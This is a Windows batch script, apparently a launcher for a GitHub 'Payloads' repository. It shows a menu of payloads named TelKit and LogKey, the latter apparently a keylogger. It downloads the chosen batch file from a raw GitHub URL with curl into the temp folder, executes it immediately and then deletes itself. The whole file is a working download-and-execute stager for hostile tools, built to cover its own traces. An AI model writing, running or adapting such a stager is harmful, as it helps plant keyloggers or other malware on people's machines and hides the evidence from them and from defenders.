@echo off
title Payloads

:: --------------------- CONFIGURATION VARIABLES ---------------------

set "version="
set "debug=0"
set "prefix=https://raw.githubusercontent.com/Jed556/Payloads/main/"
set "folder=%temp%"
set "file=r.bat"
set "dir=%folder%/%file%"

:: -------------------------------------------------------------------


:: ------------------------- GET VERSION INFO ------------------------

if "%version%"=="" (
    curl -Lso v.pls %prefix%VERSION
    set /p version=<v.pls
    del /Q /F v.pls
)

:: -------------------------------------------------------------------


:: ------------------------- CHECK ARGUMENTS -------------------------

if "%2"=="1" (
    set "debug=1"
)

:: -------------------------------------------------------------------


:: ------------------------------- ART -------------------------------

:Art
setlocal EnableDelayedExpansion
set "s=!version!"
set "len=0"
for /l %%i in (0,1,8192) do (
  set "c=!s:~%%i,1!"
  if not defined c goto :done
  set /a "len+=1"
)
:done

set /a length=31-len

set padding=
for /l %%i in (1,1,%length%) do set padding=!padding! 

:: Display art
cls
echo.
echo. [0;34m^|     [1;36m /#######  /##                     [0m                                          [0;34m^|[0m
echo. [0;34m^|     [1;36m^| ##__  ##^| ## [0;36m  /#######  [0m                                                  [0;34m^|[0m
echo. [0;34m^|     [1;36m^| ##  \ ##^| ## [0;36m /##_____/  [0m        [1;37mPayloads[0m (%version%)!padding![0m[0;34m^|[0m
echo. [0;34m^|     [1;36m^| #######/^| ## [0;36m ^|  ######  [0m        [4mGitHub.com/Jed556/Payloads[0m                [0;34m^|[0m
echo. [0;34m^|     [1;36m^| ##____/ ^| ## [0;36m  \____  ## [0m        [1;32mLauncher[0m                                  [0;34m^|[0m
echo. [0;34m^|     [1;36m^| ## [0;36m /#################/  [0m                                                  [0;34m^|[0m
echo. [0;34m^|     [1;36m^|__/ [0;36m/_________________/   [0m                                                  [0;34m^|[0m
echo.

endlocal

:: -------------------------------------------------------------------


:: ---------------------------- MAIN CODE ----------------------------

::echo %batchName% Arguments: P1=%1 P2=%2 P3=%3 P4=%4 P5=%5 P6=%6 P7=%7 P8=%8 P9=%9

:: Payload Selection
:Selection
    if [%1]==[] (
        echo Payloads
        echo [1;37m[1][0m TelKit
        echo [1;37m[2][0m LogKey
        echo [1;37m[3][0m GitHub ^(Docs^)
        echo [1;37m[4][0m Exit
        echo.
        set /p "input=Enter payload index: "
    ) else (
        set "input=%1"
    )

    if %input%==3 (
        echo Opening GitHub...
        start https://GitHub.com/Jed556/Payloads
        echo [1;32mOpened GitHub[0m
        timeout /t 30
        goto :Art
    )

    if %input%==4 (
        echo Exiting...
        goto :End
    )

    if %input%==1 (
        set "src=TelKit/telkit.bat"
        goto Curl
    )

    if %input%==2 (
        set "src=LogKey/logkey.bat"
        goto Curl
    )

    echo Invalid input. Press any key to try again...
    pause > nul
    goto Art


:: Download and launch payload
:Curl
    set "url=%prefix%%src%"
    for /f "tokens=1 delims=/" %%a in ("%url%") do set "payload=%%a"
    echo Downloading %payload%...
    shift
    cmd /c curl -Lo %dir% %url% & %dir% %*
    echo Launched

:: Exit and delete self
:End
    echo.
    echo Bye...
    timeout /t 2 > nul
    del /Q /F "%~f0" & exit

:: -------------------------------------------------------------------

